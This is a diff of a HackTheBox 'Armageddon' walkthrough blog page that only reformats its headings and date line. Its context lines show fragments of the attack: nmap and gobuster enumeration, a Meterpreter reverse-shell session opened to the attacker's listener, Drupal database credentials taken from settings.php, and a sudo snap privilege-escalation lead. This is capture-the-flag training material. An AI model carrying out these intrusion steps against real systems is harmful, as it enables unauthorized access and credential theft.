@@ -54,12 +54,12 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<p><span>July 25, 2021</span> by <span>Nasef</span></p>
 <h2 class=blog-title>Armageddon HackTheBox Walkthrough</h2>
+<p><span>July 25, 2021</span> by <span>Nasef</span></p>
 <img class=feature-image src=https://iamnasef.com/images/blog/011/featured-image.png alt=blog-feature-image>
 <p>Hello everybody !
 I am Nasef and today I am going to show you how I hacked Armageddon machine from hack the box, so let&rsquo;s get started !</p>
-<h2 id=services-enumeration>Services Enumeration</h2>
+<h3 id=services-enumeration>Services Enumeration</h3>
 <p>Nmap found ports ssh(22) and http (80) open which isn&rsquo;t interesting in itself.</p>
 <pre><code>nmap -sC -sV 10.10.10.233
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 13:14 EDT
@@ -111,7 +111,7 @@ Nmap done: 1 IP address (1 host up) scanned in 723.00 seconds
 
 
 </code></pre><p>This concludes the service enumeration phase.</p>
-<h2 id=exploiting-http-service>Exploiting HTTP Service</h2>
+<h3 id=exploiting-http-service>Exploiting HTTP Service</h3>
 <p>Using the current information I decided to further enumerate the http service, but first I added the hostname of the machine in /etc/hosts because some machines use host routing.</p>
 <p>Then I ran gobuster to enumerate hidden directories, which gave me some files, maybe for a CMS?.</p>
 <pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://armageddon.htb/ -x php,txt,git
@@ -160,7 +160,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 [*] Sending stage (39282 bytes) to 10.10.10.233
 [*] Meterpreter session 2 opened (10.10.14.23:4444 -&gt; 10.10.10.233:54426) at 2021-06-24 13:45:18 -0400
 
-</code></pre><h2 id=getting-user-shell>Getting User Shell</h2>
+</code></pre><h3 id=getting-user-shell>Getting User Shell</h3>
 <p>Unfortunately, the user apache has a restricted shell. Enumerating further, I found MySQL credentials in Drupal settings file &ldquo;sites/default/settings.php&rdquo;</p>
 <pre><code>$databases = array (
   'default' =&gt; 
@@ -205,7 +205,7 @@ There was 1 failed login attempt since the last successful login.
 Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
 [brucetherealadmin@armageddon ~]$ 
 
-</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2>
+</code></pre><h3 id=privilege-escalation>Privilege Escalation</h3>
 <p>Before running any heavy privesc scripts, I prefer going through my manual checklist. Starting with sudo, I found that I can run the /usr/bin/snap binary as root without password</p>
 <pre><code>sudo -l
 Matching Defaults entries for brucetherealadmin on armageddon:
